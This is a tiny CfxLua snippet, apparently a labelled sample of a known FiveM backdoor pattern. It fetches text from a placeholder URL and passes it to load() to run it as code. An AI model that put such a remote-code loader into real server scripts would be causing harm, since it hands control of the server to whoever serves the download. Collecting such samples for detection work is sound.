-- CfxLua: awaited HTTP response given to load.
CreateThread(function()
    local status <const>, code = PerformHttpRequestAwait('https://example.invalid/x')
    local fn = load(code)
    if fn then fn() end
end)
